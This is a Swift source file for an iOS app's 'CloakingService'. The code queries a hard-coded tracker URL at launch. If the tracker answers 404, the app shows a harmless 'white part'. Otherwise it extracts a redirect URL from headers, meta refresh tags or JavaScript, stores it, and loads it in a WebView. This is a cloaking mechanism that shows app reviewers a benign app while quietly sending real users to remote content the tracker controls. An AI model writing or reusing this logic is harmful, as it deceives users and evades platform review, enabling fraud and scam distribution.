import Foundation

class CloakingService {
    static let shared = CloakingService()

    private var trackerURL = "https://zhenazanag.pro/7L7RRMSF"

    private init() {}

    func checkCloaking() async throws -> CloakingResult {
        print("🔐 [CloakingService] Starting cloaking check...")

        if let savedResult = StorageManager.shared.cloakingResult {
            print("💾 [CloakingService] Found saved result: \(savedResult)")
            if savedResult, let url = StorageManager.shared.cloakingURL {
                print("🌐 [CloakingService] Returning saved WebView URL: \(url)")
                return .showWebView(url: url)
            } else {
                print("⚪ [CloakingService] Saved result says show white part")
                return .showWhitePart
            }
        }

        print("🌐 [CloakingService] No saved result, fetching from tracker...")
        return try await fetchCloakingResult()
    }

    func setTrackerURL(_ url: String) {
        trackerURL = url
    }

    private func fetchCloakingResult() async throws -> CloakingResult {
        print("🌐 [CloakingService] Starting request to tracker...")
        print("🔗 [CloakingService] Tracker URL: \(trackerURL)")

        guard let url = URL(string: trackerURL) else {
            print("❌ [CloakingService] Invalid URL: \(trackerURL)")
            throw CloakingError.invalidURL
        }

        var request = URLRequest(url: url)
        request.timeoutInterval = 10.0
        request.httpMethod = "GET"

        print("📤 [CloakingService] Sending GET request...")
        print("⏱️ [CloakingService] Timeout: 10 seconds")

        do {
            let (data, response) = try await URLSession.shared.data(for: request)

            guard let httpResponse = response as? HTTPURLResponse else {
                print("❌ [CloakingService] Invalid response type")
                throw CloakingError.invalidResponse
            }

            print("📥 [CloakingService] Response received")
            print("📊 [CloakingService] Status code: \(httpResponse.statusCode)")
            print("📋 [CloakingService] Headers: \(httpResponse.allHeaderFields)")

            if let responseString = String(data: data, encoding: .utf8) {
                print("📄 [CloakingService] Response body: \(responseString.prefix(200))...")
            }

            switch httpResponse.statusCode {
            case 404:
                print("🚫 [CloakingService] Status 404 - Not Found")

                StorageManager.shared.saveCloakingResult(shouldShowWebView: false, url: nil)
                print("💾 [CloakingService] Result saved: show white part")
                return .showWhitePart

            default:

                print("📊 [CloakingService] Status \(httpResponse.statusCode) - Looking for redirect URL")

                if let redirectURL = extractRedirectURL(from: httpResponse, data: data) {
                    print("🎯 [CloakingService] Found redirect URL: \(redirectURL)")

                    StorageManager.shared.saveCloakingResult(shouldShowWebView: true, url: redirectURL)
                    print("💾 [CloakingService] Result saved: show WebView")
                    return .showWebView(url: redirectURL)
                } else {
                    print("⚠️ [CloakingService] No redirect URL found, using tracker URL as fallback")

                    StorageManager.shared.saveCloakingResult(shouldShowWebView: true, url: trackerURL)
                    print("💾 [CloakingService] Result saved: show WebView with tracker URL")
                    return .showWebView(url: trackerURL)
                }
            }

        } catch {

            print("❌ [CloakingService] Network error: \(error.localizedDescription)")
            StorageManager.shared.clearCloakingResult()
            print("🗑️ [CloakingService] Cleared cloaking result due to network error")
            throw CloakingError.networkError(error)
        }
    }

    private func extractRedirectURL(from response: HTTPURLResponse, data: Data) -> String? {
        print("🔍 [CloakingService] Extracting redirect URL...")

        if let location = response.allHeaderFields["Location"] as? String {
            print("📍 [CloakingService] Found Location header: \(location)")
            return location
        }

        if let redirectURL = response.allHeaderFields["X-Redirect-URL"] as? String {
            print("📍 [CloakingService] Found X-Redirect-URL header: \(redirectURL)")
            return redirectURL
        }

        if let finalURL = response.url?.absoluteString,
           finalURL != trackerURL {
            print("📍 [CloakingService] Using final URL after redirects: \(finalURL)")
            return finalURL
        }

        if let responseString = String(data: data, encoding: .utf8) {
            print("🔍 [CloakingService] Searching for URL in response body...")

            let metaPattern = #"<meta[^>]*http-equiv\s*=\s*["']refresh["'][^>]*content\s*=\s*["']\d+;\s*url=([^"']+)["']"#
            if let regex = try? NSRegularExpression(pattern: metaPattern, options: .caseInsensitive),
               let match = regex.firstMatch(in: responseString, range: NSRange(location: 0, length: responseString.count)),
               match.numberOfRanges > 1 {
                let urlRange = match.range(at: 1)
                if let range = Range(urlRange, in: responseString) {
                    let foundURL = String(responseString[range])
                    print("📍 [CloakingService] Found meta refresh URL: \(foundURL)")
                    return foundURL
                }
            }

            let jsPatterns = [
                #"window\.location\s*=\s*["']([^"']+)["']"#,
                #"location\.href\s*=\s*["']([^"']+)["']"#,
                #"window\.location\.href\s*=\s*["']([^"']+)["']"#
            ]

            for pattern in jsPatterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive),
                   let match = regex.firstMatch(in: responseString, range: NSRange(location: 0, length: responseString.count)),
                   match.numberOfRanges > 1 {
                    let urlRange = match.range(at: 1)
                    if let range = Range(urlRange, in: responseString) {
                        let foundURL = String(responseString[range])
                        print("📍 [CloakingService] Found JavaScript redirect URL: \(foundURL)")
                        return foundURL
                    }
                }
            }
        }

        print("❌ [CloakingService] No redirect URL found")
        return nil
    }
}

enum CloakingResult {
    case showWebView(url: String)
    case showWhitePart
}

enum CloakingError: LocalizedError {
    case invalidURL
    case invalidResponse
    case networkError(Error)

    var errorDescription: String? {
        switch self {
        case .invalidURL:
            return "Invalid tracker URL"
        case .invalidResponse:
            return "Invalid response from tracker"
        case .networkError(let error):
            return "Network error: \(error.localizedDescription)"
        }
    }
}